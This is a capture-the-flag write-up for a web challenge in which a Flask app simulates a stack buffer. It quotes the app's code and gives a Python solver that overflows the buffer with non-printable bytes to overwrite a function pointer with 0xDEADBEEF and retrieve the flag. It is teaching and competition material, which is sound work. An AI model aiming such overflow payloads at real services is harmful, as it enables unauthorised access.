# cyber-gateway

## Description

```
Wait, Neo is now is Cyberpunk? Is there a Morpheus as well? And what will he be offering Neo? This world is very 0x41414141.
```

## Categories

- `web`

## Provided Files

- `cyber-gateway.zip`

## Solve Process

Simply put, the app provided expects a function address to execute.

```py
# --- snip --- #
function_map = {
    SECRET_ROUTE: secret_gateway_route,
    CYBER_ROUTE: cyber_gateway_route
}
# --- snip --- #
def index():
    if request.method == "GET":
        return (
            "Welcome to our super secure cyber gateway service!<br>"
            "Send a POST request with data to push onto our stack.<br>"
        )

    elif request.method == "POST":
        user_data = request.get_data()
        if not user_data:
            abort(400, "No input data provided.")

        if b"A" in user_data:
            abort(400, "Hacking detected")

        for char in user_data:
            if chr(char) in printable:
                abort(400, "Invalid gateway request")
        
        stack_size = 32
        fp_size = 4  
        total_size = stack_size + fp_size

        stack_memory = bytearray(total_size)

        stack_memory[stack_size : stack_size + fp_size] = CYBER_ROUTE.to_bytes(4, "little")

        for i, b in enumerate(user_data):
            if i < total_size:
                stack_memory[i] = b
            else:
                break

        fp = int.from_bytes(stack_memory[stack_size : stack_size + fp_size], "little")
        if fp in function_map:
            result = function_map[fp]()
        else:
            result = f"Segfault! Invalid function pointer: {fp}"

        return result
# --- snip --- #
```

The implementation of the `stack_memory` allows us to overflow it with other bytes while bypassing the "security check" (`if b"A" in user_data`) using other byte values.

```py
import requests

SECRET_ROUTE    = 0xDEADBEEF
CYBER_ROUTE     = 0x41414141

def secret_gateway_route():
    return 0

def cyber_gateway_route():
    return 0

function_map = {
    SECRET_ROUTE: secret_gateway_route,
    CYBER_ROUTE: cyber_gateway_route
}

CHALLENGE_HOST = "2aoh326wa2ifiea9.dyn.acsc.land"
REQUEST_PAYLOAD = b'\x11'*32 + SECRET_ROUTE.to_bytes(4, 'little')

stack_size = 32
fp_size = 4  
total_size = stack_size + fp_size
stack_memory = bytearray(total_size)
stack_memory[stack_size : stack_size + fp_size] = CYBER_ROUTE.to_bytes(4, "little")

for i, b in enumerate(REQUEST_PAYLOAD):
    if i < total_size:
        stack_memory[i] = b
    else:
        break

fp = int.from_bytes(stack_memory[stack_size : stack_size + fp_size], "little")

print(f"[+] Payload is: {REQUEST_PAYLOAD}")
print(f"[+] Payload produces function pointer: {fp} -> needed: {SECRET_ROUTE}")
print("[+] Sending payload")
RESPONE = requests.post(url=f"https://{CHALLENGE_HOST}/", data=REQUEST_PAYLOAD, allow_redirects=True)
if RESPONE.status_code == 200:
    print("[+] Success")
    print(f"[+] Flag: {RESPONE.text}")
else:
    print(f"[-] Payload returned with status: {RESPONE.status_code}")
    print(f"[-] Error: {RESPONE.text}")
```

Solver script is a bit more informative than needed but pretty self explanatory, another flag for us.
